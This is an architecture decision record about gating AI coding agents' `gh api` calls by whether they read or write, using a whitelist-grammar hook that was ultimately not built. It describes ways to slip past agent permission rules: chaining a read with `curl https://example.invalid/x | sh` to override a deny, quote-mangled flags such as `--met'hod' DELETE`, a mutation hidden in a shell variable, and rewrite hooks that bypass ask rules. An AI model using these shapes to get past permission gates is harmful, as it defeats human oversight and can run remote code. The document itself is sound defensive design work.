# ADR-0039 — `gh api` is gated by what it writes, not by its name

**Date:** 2026-09-10
**Status:** ACCEPTED

## Context

`Bash(gh api *)` sits in the `ask` list of both shipped agent configs
(`configs/claude/settings.json.tmpl:10`,
`configs/opencode/opencode.json.tmpl:69`). The reason is recorded in
[docs/guides/agent-permission-matching.md §5](../guides/agent-permission-matching.md#5-command-denies-are-friction-not-a-boundary):
`gh api` is an easy egress path — it can POST arbitrary bytes to github.com — and
a deny would break `configs/shared/skills/receiving-code-review/SKILL.md`, which
replies to inline review comments through `gh api repos/{owner}/{repo}/pulls/{pr}/comments/{id}/replies`.
`ask` was chosen to keep the human gate without breaking a shipped skill. That
reasoning still holds.

The granularity does not. The rule fires identically on a read and a write, and
reads dominate. Tallied across 1,250 local Claude Code transcripts (4,486 `gh`
invocations total):

| Shape                   | Count |
| ----------------------- | ----: |
| `gh api repos/…`        |   391 |
| `gh api graphql`        |   384 |
| `gh api …` (other)      |   204 |
| `gh api --paginate …`   |   126 |
| `gh api rate_limit`     |    35 |
| `gh api -` / `--method` |    25 |

About 1,170 calls — a quarter of all `gh` usage — resolve to one `ask`, and the
overwhelming majority are GETs: reading a PR, a review thread, a check run, a
rate limit. Every one of them stops the agent and asks a human a question whose
answer is always yes. Meanwhile `gh pr merge` and `gh release delete` are in
neither list.

The blunt rule is not just noisy; the noise is the security problem. A gate that
fires a thousand times on reads trains the human to approve without reading, so
the one prompt that mattered — the `--method DELETE` — gets the same reflexive
yes as the 999 before it.

`gh api` announces which side it is on, in the invocation itself. A REST
invocation issues a GET unless one of these is present:

- `--method <verb>` / `-X <verb>` with a verb other than `GET` or `HEAD`
- any of `-f` / `-F` / `--field` / `--raw-field` / `--input` — each of these
  makes `gh api` default to POST, per `gh api --help`

`gh api graphql` is the exception, and it has to be, or the split buys almost
nothing. GraphQL is POST at the HTTP layer always, and the query travels in a
`-f query=…` field — so the flag test above would classify all 384 measured
`gh api graphql` calls as writes, which is most of the traffic this decision
exists to unblock. For a `graphql` invocation the operation type in the body is
the discriminator instead: a mutation must carry the literal `mutation` keyword,
because GraphQL's anonymous-shorthand form (`{ … }`) is only legal for queries.
So a `graphql` segment is a read exactly when no `mutation` keyword appears in
it, and the `-f`/`--field` flags are expected there rather than disqualifying.

A glob cannot express that. `Bash(gh api --method *)` matches only when the flag
lands immediately after `api`, so `gh api repos/a/b/issues --method POST` walks
straight past it — the leak shape §5 of the matching guide already warns about.
Claude Code's resolution order (deny → ask → allow, first match wins, no
specificity tiebreak) also makes "broad allow with a narrow ask carve-out"
inexpressible there.

What _can_ express it is a hook. devgeta already runs three `PreToolUse` hooks
that scan a command at segment level against
`configs/claude/lib/segments.sh` — `task-redirect.sh`, `secret-guard.sh`,
`suppression-guard.sh` — and their OpenCode mirrors under
`configs/opencode/plugin/`. Two capabilities make the split implementable
symmetrically, both verified rather than assumed:

- **Claude Code:** a `PreToolUse` hook returning `permissionDecision: "allow"`
  overrides the `ask` list. Measured on 2.1.245 (this is the same mechanism
  ADR-0038 removes from rtk's hands — the capability is fine, the question is who
  holds it).
- **OpenCode: unresolved, and it must be probed before either classifier is
  written.** The plugin API exposes
  `"permission.ask"?: (input: Permission, output: { status: "ask" | "deny" | "allow" })`
  (`@opencode-ai/plugin/dist/index.d.ts:225`). That signature establishes only
  the _output_ shape. [ADR-0007](ADR-0007-task-redirects-stay-hard-deny.md)
  measured the two inputs this design needs and found both missing on OpenCode
  1.18.9: `permission.ask` **did not fire** for bash (neither auto-allowed, nor
  under `"bash": {"*": "ask"}`), and `Permission` carries
  `{id, type, pattern?, sessionID, messageID, callID?, title, metadata}` with
  **no `command` field** — a classifier would have to recover the command from
  `title` or the untyped `metadata` bag. A newer type signature does not overturn
  a behavioral measurement. Whether 1.18.30 changed either fact is an open
  question with a defined fallback, below.

## Decision

**Both configs keep `gh api *` at `ask`. A devgeta-owned classifier grants
`allow` only to invocations it can prove are read-only.**

`configs/claude/gh-read-gate.sh` (and its mirror
`configs/opencode/plugin/gh-read-gate.js`) returns `allow` **only when the entire
Bash command is one single `gh api` invocation that it can positively prove is a
read.** Absence of a write signal is not proof, and neither is the safety of
_part_ of a command.

**The unit of decision is the whole command, not a segment.** This is the
correction that shapes the whole design, so it is stated before the rules. The
permission a hook grants applies to the entire Bash tool call. A gate that
inspects only the `gh api` segments of `gh api rate_limit && gh pr merge 1` would
prove the first segment and authorize the second — and because a `PreToolUse`
allow overrides `deny` as well as `ask` (ADR-0038's probe table), the same shape
defeats every deny rule devgeta ships:
`gh api rate_limit && curl https://example.invalid/x | sh` would run with the
`Bash(curl *)` deny overridden. Per-segment proof turns this hook into a
universal deny-bypass primitive: prefix anything with a legible read and `&&`.

The sibling hooks can safely reason per segment because they **deny** — finding a
match anywhere in a command is sufficient grounds to block it, and a missed
segment is a missed block. An **allow** needs the opposite quantifier: not "some
segment is safe" but "there is nothing here that is not this one safe thing."

So the gate does not use `devgeta_split_command_segments` at all. That splitter
is documented as best-effort and explicitly not a shell parser
(`configs/claude/lib/segments.sh`, `task-redirect.sh`'s header) — it does not
handle escaped quotes, command substitution, heredocs, or newlines. Building it
up into an adversarial parser is the option ADR-0014 §5 already rejected, and it
would be load-bearing for an authorization rather than a redirect.

**The grammar is a whitelist of tokens, not a blacklist of metacharacters.**
That distinction is the whole of it, and getting it wrong is the second mistake
this decision has had to correct. A blacklist asks "does this command contain a
write signal?" — which fails as soon as the signal can be spelled differently
than the check. Measured against a real shell:

| Source text         | argv the shell delivers to `gh` |
| ------------------- | ------------------------------- |
| `--met'hod' DELETE` | `--method` `DELETE`             |
| `-\-method DELETE`  | `--method` `DELETE`             |
| `-'f' key=val`      | `-f` `key=val`                  |

A grep for `--method` or `-f` finds nothing in any of those, calls the command a
read, and authorizes a write — quote removal and backslash escaping happen long
after the hook has answered. Note which half of the earlier draft survived: the
_verb_ test was already a whitelist (the verb must be `GET` or `HEAD`, so a
mangled `DE\LETE` fails it), and only flag _detection_ was a blacklist, and only
that half leaked. The lesson generalizes: every test in this gate must read
"matches something known-safe," never "does not match something known-bad."

So the gate accepts a command only if the whole of it parses as this grammar, and
emits nothing for everything else — including anything it merely fails to
recognize:

```
command   := "gh" WS "api" (WS arg)*
arg        := token | fieldarg
token      := bare | squoted        # one or the other, with nothing adjacent
fieldarg   := name "=" squoted      # the ONE permitted concatenation; graphql only
name       := [A-Za-z_][A-Za-z0-9_]*
bare       := [A-Za-z0-9_./:@=-]+   # no quote, backslash, or glob character
squoted    := "'" [^'\\]* "'"       # fully quoted, no embedded quote or escape
WS         := (" " | "\t")+
```

- **`fieldarg` is the one concatenation the grammar admits, and it exists because
  without it nothing GraphQL could ever parse.** `-f query='query{…}'` is a bare
  `query=` fragment butted against a quoted span; under `token` alone it is
  exactly the `--met'hod'` shape the previous rule refuses, so the only GraphQL
  form this decision claims to allow was unparseable. `fieldarg` is deliberately
  narrower than "any concatenation": the left side is a bare identifier followed
  by a single `=`, the right side is one fully-quoted span, and nothing may
  follow it. `query=foo'query{…}'` does not parse (the name is followed by `foo`
  before the quote), and neither does `'query'='…'`.
- **Tokens may not otherwise be concatenated.** `--met'hod'` is not a `fieldarg`
  (no `=`), so it still refuses.
- **No backslash anywhere**, quoted or not. No glob metacharacter (`*`, `?`, `[`,
  `]`, `{`, `}`, `~`) in a **bare** token, so pathname expansion cannot
  manufacture an argument.
- **`$` and backticks are refused in a bare token and permitted inside
  `squoted`** — this is a scoping distinction the earlier draft got wrong by
  banning them "anywhere," which contradicted the `squoted` production on the
  line above it. Inside single quotes the shell performs no expansion at all
  (verified: `-f 'query=$Q'` arrives as the literal `query=$Q`), so the character
  is inert text, and refusing it would reject GraphQL variables — `query='query
($n:Int){…}'` is an ordinary read. It does not reopen the hidden-mutation case
  either: a literal `$Q` reaching GitHub is a GraphQL syntax error, not a
  mutation, and the attack in that case used **double** quotes, which are not in
  this grammar.
- **Whitespace is spaces and tabs only** _between_ tokens — a newline, carriage
  return, vertical tab or form feed refuses the command. Whitespace **inside** a
  `squoted` span does not separate tokens (verified), so
  `query='query { viewer { login } }'` is one argument.
- **Separators and redirects cannot appear at all.** None of their characters are
  in `bare`, and a `squoted` span is a single argument, so `&&`, `||`, `;`, `|`,
  `&`, `>`, `>>`, `<` and heredocs are unparseable here rather than each needing
  its own rejection rule.
- The command must **begin** with `gh api`, which excludes a leading `VAR=value`
  assignment and every wrapper (`env`, `sudo`, `xargs`, `sh -c`).

**Flags are a whitelist too.** Every flag token must be one this list names, with
its value in a form the list names; an unrecognized flag refuses the command. The
read-only set, from `gh api --help`:

`--paginate`, `--slurp`, `--verbose`, `--cache <token>`, `-H`/`--header <token>`,
`--hostname <token>`, `-q`/`--jq <token>`, `-t`/`--template <token>`, and
`-X`/`--method` **only** with the value `GET` or `HEAD`.

- **REST** (no `graphql` token): the body flags `-f`, `-F`, `--field`,
  `--raw-field`, `--input` are simply absent from the list, so they refuse the
  command. There is no detection step to evade and no spelling to miss.
- **GraphQL** (a `graphql` token present): `-f`/`--field` is additionally
  admitted, and only with a `fieldarg` value. Exactly one of those fields must be
  named `query`; further `-f name='…'` fields are permitted as GraphQL variables,
  which cannot change the operation type — the query document alone determines
  that. Two `query=` fields refuse, and zero refuse.

  **The value handed to the operation check is the `squoted` content with the
  enclosing quotes stripped and no further unescaping** (single quotes admit no
  escapes, so there is nothing to unescape — this is stated because "does the
  classifier see the quotes?" is exactly the ambiguity that produces an
  off-by-one bug in the first token test). On that string: the first
  whitespace-delimited token must be `query` or begin `{` (the
  anonymous-shorthand form, legal only for queries), the string must be
  non-empty, and no `mutation` or `subscription` keyword may appear anywhere in
  it. `--input` and `-F`/`--raw-field` stay off the list entirely, so an
  out-of-band body refuses.

**What this costs, plainly.** `gh api repos/a/b/pulls/1 | jq .title` is a very
common shape and no longer gets the auto-allow, because the pipe does not parse.
The mitigation is that `gh api` has its own output filters — `--jq` and
`--template` — which stay inside the single invocation and are on the flag
allowlist, so the same work is expressible without a pipe
(`gh api rate_limit --jq .rate.limit`). Whether to extend the grammar to a
trailing `| jq <token>` is a real question with its own analysis, and it is
deliberately **not** decided here: every extension re-opens the quantifier
problem above and has to earn its keep against it.

A double-quoted token is also absent from the grammar, deliberately. `"…"` still
expands `$` and backticks inside it, so admitting it would mean re-deriving
which contents are inert — the analysis that produced the leak above. Single
quotes are inert by definition, so the grammar takes only those, and a
double-quoted read prompts. This is a real false-ask, and it is the price of the
whitelist being checkable by inspection.

Anything else — including anything the classifier cannot parse confidently —
returns no decision, and the `ask` in the permission list fires exactly as it
does today.

Three properties make this safe to reason about:

1. **The floor never moves.** `gh api *` stays `ask` in both configs, so
   `permissions_test.go`'s string parity is untouched and the policy a human
   reads is unchanged. The classifier only ever _narrows_ what prompts; it can
   never widen what is permitted, because a hook that emits nothing leaves the
   list in charge.
2. **The default is to ask.** Every ambiguity — an unrecognized flag, an
   unsupported shell construct, a missing `jq` — resolves to the existing prompt.
   The failure mode is the status quo, not an opening.
3. **The quantifier is universal, not existential.** The gate allows a command
   only by recognizing the whole of it. There is no path by which unexamined text
   rides along inside an authorized call.

### The OpenCode route: probe, or drop from both

Implementation probes `permission.ask` on the installed OpenCode **before** either
classifier is written, by ADR-0007's method (a plugin logging both candidate
hooks, in a scratch project, with a control). If it fires for a `gh api *` ask
_and_ the command text is recoverable from the payload, the mirror is written as
described.

**If either half fails, the carve-out is dropped from both agents** and the blunt
`ask` stays everywhere. There are exactly these two outcomes.

An earlier draft of this ADR offered a middle option — express the split in
OpenCode's permission list, using `"gh api *": "allow"` plus longer `ask`
patterns for the write shapes, relying on OpenCode's longest-match resolution.
**That option is withdrawn, because this ADR's own Context section refutes it.**
Positional globs cannot see a flag wherever it lands, and the write shapes the
kind test must catch include `-XDELETE` (attached), `--method=POST`
(equals-form), attached field flags, and flags on either side of the endpoint.
Covering those with patterns means enumerating every spelling and maintaining
that list against future `gh` releases — precisely the enumerate-and-maintain
approach [ADR-0014 §4](ADR-0014-agent-config-protection-is-a-guard-not-a-path-deny.md)
rejected, and here it would be enumerating the cases that must be **denied**,
where an omission is an authorization rather than a gap in coverage. No finite
pattern set was demonstrated, so none is offered.

Dropping from both is also what [CLAUDE.md §12](../../CLAUDE.md#keeping-the-two-ai-agents-in-sync)
already prescribes: a rule that cannot be expressed in one agent is dropped from
both. The withdrawn middle rung was an attempt to route around that rule, and it
would have cost an amendment to `permissions_test.go`'s parity check to land. If
OpenCode cannot express the carve-out safely, the honest outcome is that neither
agent gets it — and steps 1–7 of the cycle (the rtk shim and the write gates)
stand on their own and carry most of the security benefit regardless.

The same cycle adds `ask` entries for `gh pr merge`, `gh release delete`,
`gh pr close` and `gh issue delete` to both configs — writes that are gated by
nothing today.

Rejected alternatives:

- **Glob patterns for the write flags.** Leaky by position, as shown above, and
  a leaky gate is worse than an honest one because it reads as protection.
- **Per-segment proof over the shared segmenter.** Allow the call when every
  `gh api` segment proves out. This was the first draft of this decision and it
  is unsafe: it authorizes the segments it never examined, so
  `gh api rate_limit && gh pr merge 1` clears the gate, and because a hook allow
  overrides `deny` too,
  `gh api rate_limit && curl https://example.invalid/x | sh` clears it past the
  `Bash(curl *)` deny. Any allow-issuing gate built on a best-effort splitter has
  this shape.
- **Prove every segment, with a hardened splitter.** Fixes the quantifier but
  requires the segmenter to become an adversarial shell parser — escaped quotes,
  substitution, heredocs, newlines — load-bearing for an authorization. ADR-0014
  §5 rejected building that matcher for the weaker deny case; it is a worse bet
  here.
- **Allow `gh api` outright.** Removes the outward-egress gate entirely. The
  `ask` on writes is the part of the rule that was doing work.
- **Keep the blunt `ask`.** Preserves a gate nobody reads, and leaves merges and
  deletes ungated while a thousand reads get prompted. The current state.

## Consequences

**Corrected 2026-09-10, from the implementing cycle's step 1 probe and its
step 11 verification — read this before the rest of this section, which
describes what was _designed_, not what _shipped_.** Full evidence:
`docs/plans/cycles/2026-09-10-gh-permission-granularity-probe-notes.md`.

1. **The OpenCode route resolved to "drop from both," the second of the two
   outcomes this ADR names.** `permission.ask` still does not fire for bash on
   OpenCode 1.18.30 (unchanged from ADR-0007's 1.18.9 finding), so
   `gh-read-gate.sh` and `gh-read-gate.js` were never written — the read
   carve-out described throughout the Decision section above does not exist on
   either agent. `gh api *` stays a blunt `ask` everywhere, exactly as in "the
   current state" this ADR lists as a rejected alternative. The rest of this
   document's description of the classifier, its grammar, and its tests
   describes a design that was not built, kept here because the _reasoning_
   (why a whitelist, why the whole-command quantifier, the three named
   mistakes) remains correct and instructive should the carve-out be
   revisited with a different OpenCode capability.
2. **Separately, the four write-`ask` gates this ADR does say shipped
   (`gh pr merge *`, `gh release delete *`, `gh pr close *`, `gh issue delete
*`) do not fire on Claude Code for a user with the rtk integration
   enabled**, for a reason unrelated to anything in this ADR: devgeta's own
   `"allow": ["Bash(*)"]` baseline, combined with any `PreToolUse` hook that
   rewrites the command (the rtk shim included), bypasses `ask`/`deny` rules
   that only match the pre-rewrite text. See ADR-0038's "Corrected 2026-09-10"
   consequence for the full measurement. The gates are still correct and
   still fire for a non-rtk user or a command no hook rewrites.

The "Easier" claim immediately below was written against the un-corrected
design and should be read as describing the read carve-out's intended value
had it shipped, not a claim about current behavior.

**Easier, but by materially less than the raw tally suggests.** The ~1,170 `gh
api` calls measured in Context are an upper bound taken before the grammar
existed, and it refuses several shapes that are ordinary reads:

- anything piped or chained (`gh api … | jq …`, `gh api … && gh api …`)
- a double-quoted argument, even with inert contents
  (`gh api "repos/a/b/pulls/1"`)
- a variable interpolated outside single quotes
  (`gh api "repos/$O/$R/pulls/1"`) — though `-f 'query=…$var…'` inside single
  quotes is fine, since the shell expands nothing there
- any `gh` flag the allowlist has not enumerated

All common shapes, so the honest claim is "a substantial share of the reads," not
"a thousand prompts." The real figure is a measurement to take at the cycle's
manual-verification step, and it should be recorded there rather than predicted
here — if it comes out small, this decision is not worth its maintenance cost and
should be reconsidered rather than defended. `--jq`/`--template` inside the single
invocation recover part of the piped case. Unattended review work
(`configs/shared/skills/receiving-code-review`, the `pr-review-loop` and
`review-loop` commands) reads PR state without a human in the loop, while its
_write_ step still asks.

**Harder.** Two more files to keep in one-for-one sync, joining the
`task-redirect` and `secret-guard` pairs
([docs/guides/agent-sync.md](../guides/agent-sync.md)). The flag list is a fact
about `gh`'s CLI, so a future `gh` that adds another body-carrying flag would let
that shape through as a read. Mitigated by asserting the flag list in a test with
a comment pointing at `gh api --help`, and by the fact that the miss requires a
new `gh` flag, not a crafted command.

**Why this gate is strict, in three corrections.** The design above is the third
version. Each earlier one failed the same way — it asked whether a write signal
was _present_ instead of whether a read was _proven_ — and each is recorded here
because the mistake is easy to repeat:

1. **Absence of `mutation` read as a query.**
   `Q='mutation{…}'; gh api graphql -f query="$Q"` hides the keyword in a
   variable. Fixed by requiring the operation be positively a query.
2. **Per-segment proof.** Proving only the `gh api` segments authorized the rest
   of the command, so `gh api rate_limit && gh pr merge 1` cleared the gate —
   and since a hook allow overrides `deny` too,
   `gh api rate_limit && curl https://example.invalid/x | sh` cleared it past the
   `Bash(curl *)` deny. Fixed by making the whole command the unit of decision.
3. **Blacklisted flag spellings.** `--met'hod' DELETE` and `-'f' key=val` reach
   `gh` as clean `--method DELETE` and `-f key=val` while matching no grep for
   them. Fixed by the token-and-flag whitelist above.

The root cause is the same each time, and it is a quantifier. The three sibling
hooks (`task-redirect.sh`, `secret-guard.sh`, `suppression-guard.sh`) **deny**:
finding a bad pattern anywhere is sufficient grounds to block, a miss is a missed
block, and the policy stays intact. This hook **allows**: a miss is an
authorization that overrides `ask` and `deny` alike. "Some part looks safe" is
the wrong test; "all of this parses as one known-safe thing" is the right one.
Any future change to this gate has to be checked against that, not against
whether it catches the attacks listed above.

**Not claimed.** The whitelist makes the gate conservative rather than
optimistic, but it is still not a sandbox — the same limit
[the matching guide §5](../guides/agent-permission-matching.md#5-command-denies-are-friction-not-a-boundary)
states for every command rule devgeta ships. What it now does is refuse to decide
on anything it does not fully recognize, so an evasion attempt produces a prompt
rather than an authorization. The residual cost is false asks — a double-quoted
endpoint, an interpolated variable, a piped `jq`, a flag `gh` supports that the
allowlist has not enumerated — every one of which keeps prompting exactly as
today. That is the correct direction to be wrong in, and how much of the win
survives it is a measurement to take, not a claim to make here.

**A read is still a read.** Allowing GETs does not widen the prompt-injection
surface: `gh pr view` and `gh issue view` already pull untrusted repository text
into the context unprompted, and they are 1,150 calls of the same tally. This
decision changes nothing about that exposure in either direction.

**Generality.** The classifier encodes facts about `gh`, not about devgeta
([CLAUDE.md principle 8](../../CLAUDE.md#3-product-principles)). It fires in every
repo, gates on nothing about this one, and is inert when `gh` is absent.

## Related

- [ADR-0038](ADR-0038-a-third-party-hook-does-not-decide-devgeta-s-permissions.md)
  — why the rtk override has to go first, or these gates cannot fire at all
- [ADR-0007](ADR-0007-task-redirects-stay-hard-deny.md) — the sibling decision on
  a hook that denies rather than gates, and the source of the OpenCode
  `permission.ask` measurements this decision treats as still-standing until
  re-probed
- [docs/guides/agent-permission-matching.md](../guides/agent-permission-matching.md)
  — §5 on why `gh api` was `ask` and not `deny`, and the probe method
